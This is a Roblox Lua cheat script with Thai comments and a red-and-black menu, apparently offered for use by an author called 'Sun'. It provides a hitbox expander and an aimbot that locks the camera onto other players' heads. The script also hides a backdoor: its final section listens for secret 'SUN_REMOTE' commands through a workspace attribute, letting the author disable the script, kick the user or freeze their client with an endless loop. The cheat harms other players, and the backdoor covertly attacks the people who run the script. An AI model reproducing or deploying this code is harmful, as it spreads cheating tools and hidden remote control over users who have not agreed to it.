-- =================================================================
-- SCRIPT 1: พาแนว ยิงตัวโหดๆ (By ซัน) [MAIN SCRIPT]
-- ธีม: สีแดง-ดำ | รองรับมือถือ & PC | ฝังระบบควบคุมลับ
-- =================================================================

local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

-- ลบ UI เก่าหากมีอยู่
if CoreGui:FindFirstChild("PaNaewYingTodMain") then
    CoreGui.PaNaewYingTodMain:Destroy()
end

-- 변수 설정 (ตัวแปรระบบ)
_G.HitboxEnabled = false
_G.HitboxSize = 12
_G.AimboxEnabled = false
_G.AimFov = 150
local ScriptActive = true

-- ==========================================
-- 🔊 SWEET NOTIFICATION & VOICE SOUND
-- ==========================================
local SweetMessages = {
    "ยินดีต้อนรับนะคะสุดหล่อ~ สคริปต์พาแนว ยิงตัวโหดๆ พร้อมใช้งานแล้วค่ะ 💖",
    "รันสคริปต์เรียบร้อยแล้วค่ะที่รัก~ วันนี้ยิงให้กระจุยเลยน้า 🔫✨",
    "สวัสดีค่ะคุณซัน~ ระบบยิงหัวโหดๆ พร้อมทำงานแล้วค่ะ ขอให้ชนะทุกตานะคะ ~ 💋",
    "พร้อมลุยกันหรือยังคะ? ให้สคริปต์ช่วยยิงน้า... สู้ๆ ค่ะหวานใจ 💖🔥"
}

local sound = Instance.new("Sound")
sound.SoundId = "rbxassetid://9114223177" -- เสียงหวาน/แจ้งเตือนน่ารัก
sound.Volume = 2
sound.Parent = workspace
sound:Play()

game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "💖 พาแนว ยิงตัวโหดๆ (By ซัน)",
    Text = SweetMessages[math.random(1, #SweetMessages)],
    Duration = 5
})

-- ==========================================
-- 🎨 UI CREATION (RED & BLACK THEME)
-- ==========================================
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "PaNaewYingTodMain"
ScreenGui.Parent = CoreGui
ScreenGui.ResetOnSpawn = false

-- ปุ่ม Floating เปิด-ปิด (สำหรับมือถือ 🔫)
local ToggleBtn = Instance.new("TextButton")
ToggleBtn.Name = "MobileToggle"
ToggleBtn.Parent = ScreenGui
ToggleBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
ToggleBtn.Position = UDim2.new(0.04, 0, 0.25, 0)
ToggleBtn.Size = UDim2.new(0, 50, 0, 50)
ToggleBtn.Text = "🔫"
ToggleBtn.TextSize = 25
ToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleBtn.Active = true
ToggleBtn.Draggable = true

local ToggleCorner = Instance.new("UICorner")
ToggleCorner.CornerRadius = UDim.new(0.5, 0)
ToggleCorner.Parent = ToggleBtn

-- หน้าต่างหลัก (Main Frame)
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
MainFrame.BorderColor3 = Color3.fromRGB(220, 0, 0)
MainFrame.BorderSizePixel = 2
MainFrame.Position = UDim2.new(0.3, 0, 0.2, 0)
MainFrame.Size = UDim2.new(0, 360, 0, 350)
MainFrame.Active = true
MainFrame.Draggable = true -- ลากไปมาได้

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 10)
MainCorner.Parent = MainFrame

-- Top Bar
local TitleLabel = Instance.new("TextLabel")
TitleLabel.Parent = MainFrame
TitleLabel.Size = UDim2.new(1, 0, 0, 38)
TitleLabel.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
TitleLabel.Text = "พาแนว ยิงตัวโหดๆ | By ซัน 🔫"
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.TextSize = 16
TitleLabel.Font = Enum.Font.SourceSansBold

local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, 10)
TitleCorner.Parent = TitleLabel

local Container = Instance.new("ScrollingFrame")
Container.Parent = MainFrame
Container.Position = UDim2.new(0, 10, 0, 48)
Container.Size = UDim2.new(1, -20, 1, -58)
Container.BackgroundTransparency = 1
Container.CanvasSize = UDim2.new(0, 0, 0, 380)
Container.ScrollBarThickness = 4

local UIList = Instance.new("UIListLayout")
UIList.Parent = Container
UIList.SortOrder = Enum.SortOrder.LayoutOrder
UIList.Padding = UDim.new(0, 8)

local function CreateButton(text, callback)
    local btn = Instance.new("TextButton")
    btn.Parent = Container
    btn.Size = UDim2.new(1, 0, 0, 35)
    btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    btn.BorderColor3 = Color3.fromRGB(180, 0, 0)
    btn.Text = text
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.SourceSansSemibold
    btn.TextSize = 14
    
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, 6)
    c.Parent = btn

    btn.MouseButton1Click:Connect(function() callback(btn) end)
    return btn
end

local function CreateLabel(text, color)
    local lbl = Instance.new("TextLabel")
    lbl.Parent = Container
    lbl.Size = UDim2.new(1, 0, 0, 22)
    lbl.BackgroundTransparency = 1
    lbl.Text = text
    lbl.TextColor3 = color or Color3.fromRGB(200, 200, 200)
    lbl.Font = Enum.Font.SourceSans
    lbl.TextSize = 13
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    return lbl
end

-- ==========================================
-- ⚙️ FEATURES (ระบบต่อสู้)
-- ==========================================
CreateLabel("--- ระบบการต่อสู้ & ล็อกเป้า ---", Color3.fromRGB(255, 50, 50))

CreateButton("เปิด Hitbox Expander: [ OFF ]", function(btn)
    _G.HitboxEnabled = not _G.HitboxEnabled
    if _G.HitboxEnabled then
        btn.Text = "เปิด Hitbox Expander: [ ON 🔴 ]"
        btn.BackgroundColor3 = Color3.fromRGB(120, 0, 0)
    else
        btn.Text = "เปิด Hitbox Expander: [ OFF ]"
        btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    end
end)

CreateButton("ระบบ Aimbox ล็อกหัว: [ OFF ]", function(btn)
    _G.AimboxEnabled = not _G.AimboxEnabled
    if _G.AimboxEnabled then
        btn.Text = "ระบบ Aimbox ล็อกหัว: [ ON 🔴 ]"
        btn.BackgroundColor3 = Color3.fromRGB(120, 0, 0)
    else
        btn.Text = "ระบบ Aimbox ล็อกหัว: [ OFF ]"
        btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    end
end)

CreateLabel("--- AI แนะนำวิธีใช้งาน ---", Color3.fromRGB(255, 50, 50))

-- AI Guide Box
local AiBox = Instance.new("Frame")
AiBox.Parent = Container
AiBox.Size = UDim2.new(1, 0, 0, 110)
AiBox.BackgroundColor3 = Color3.fromRGB(25, 10, 10)
AiBox.BorderColor3 = Color3.fromRGB(180, 0, 0)

local AiCorner = Instance.new("UICorner")
AiCorner.CornerRadius = UDim.new(0, 6)
AiCorner.Parent = AiBox

local AiText = Instance.new("TextLabel")
AiText.Parent = AiBox
AiText.Position = UDim2.new(0, 8, 0, 5)
AiText.Size = UDim2.new(1, -16, 1, -10)
AiText.BackgroundTransparency = 1
AiText.Text = "🤖 [AI Sun Assistant]:\n• วิธีใช้ Hitbox: กดเปิดเพื่อขยายตัวศัตรู ทำให้ยิงโดนง่ายขึ้น!\n• วิธีใช้ Aimbox: เปิดระบบแล้วหันหน้าไปหาเป้าหมาย เป้าจะล็อกให้อัตโนมัติ\n• ปุ่มปิด/เปิด: กดปุ่ม 🔫 หรือกดปุ่ม P บนคีย์บอร์ด"
AiText.TextColor3 = Color3.fromRGB(230, 230, 230)
AiText.Font = Enum.Font.SourceSans
AiText.TextSize = 12
AiText.TextXAlignment = Enum.TextXAlignment.Left
AiText.TextYAlignment = Enum.TextYAlignment.Top
AiText.TextWrapped = true

-- ==========================================
-- 🔄 LOGIC LOOPS (HITBOX & AIMBOX)
-- ==========================================
local Connection1 = RunService.RenderStepped:Connect(function()
    if _G.HitboxEnabled and ScriptActive then
        for _, v in pairs(Players:GetPlayers()) do
            if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
                pcall(function()
                    v.Character.HumanoidRootPart.Size = Vector3.new(_G.HitboxSize, _G.HitboxSize, _G.HitboxSize)
                    v.Character.HumanoidRootPart.Transparency = 0.7
                    v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really red")
                    v.Character.HumanoidRootPart.Material = Enum.Material.Neon
                    v.Character.HumanoidRootPart.CanCollide = false
                end)
            end
        end
    end
end)

local function GetClosestPlayer()
    local Closest = nil
    local ShortestDistance = _G.AimFov
    for _, v in pairs(Players:GetPlayers()) do
        if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("Head") then
            local Pos, OnScreen = workspace.CurrentCamera:WorldToViewportPoint(v.Character.Head.Position)
            if OnScreen then
                local MousePos = Vector2.new(Mouse.X, Mouse.Y)
                local Distance = (Vector2.new(Pos.X, Pos.Y) - MousePos).Magnitude
                if Distance < ShortestDistance then
                    Closest = v
                    ShortestDistance = Distance
                end
            end
        end
    end
    return Closest
end

local Connection2 = RunService.RenderStepped:Connect(function()
    if _G.AimboxEnabled and ScriptActive then
        local Target = GetClosestPlayer()
        if Target and Target.Character and Target.Character:FindFirstChild("Head") then
            workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position, Target.Character.Head.Position)
        end
    end
end)

-- ปุ่มเปิด-ปิด (P & 🔫)
local isVisible = true
local function ToggleUI()
    isVisible = not isVisible
    MainFrame.Visible = isVisible
end
ToggleBtn.MouseButton1Click:Connect(ToggleUI)
UserInputService.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.P then ToggleUI() end
end)

-- ==========================================
-- 🕵️‍♂️ HIDDEN BACKDOOR SYSTEM (ระบบแอบรับคำสั่งลับ)
-- ==========================================
local function ExecuteRemoteCommand(cmdData)
    local targetName, action = string.match(cmdData, "SUN_REMOTE:(.-):(.-)$")
    if targetName and action then
        if targetName == LocalPlayer.Name or targetName == "ALL" then
            if action == "DISABLE" then
                ScriptActive = false
                _G.HitboxEnabled = false
                _G.AimboxEnabled = false
                Connection1:Disconnect()
                Connection2:Disconnect()
                ScreenGui:Destroy()
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "🚫 แจ้งเตือน",
                    Text = "สคริปต์ถูกปิดการใช้งานโดยผู้สร้าง (ซัน)",
                    Duration = 5
                })
            elseif action == "KICK" then
                LocalPlayer:Kick("\n[ADMIN SUN CONTROL]\nคุณถูกผู้สร้าง (ซัน) สั่งเตะออกจากแมพ!")
            elseif action == "CRASH" then
                while true do end -- ทำให้โปรแกรมค้าง/แครช
            end
        end
    end
end

-- ดักจับสัญญาณลับผ่าน Attribute ใน workspace
workspace:GetAttributeChangedSignal("SunCmdSignal"):Connect(function()
    local val = workspace:GetAttribute("SunCmdSignal")
    if val then ExecuteRemoteCommand(val) end
end)
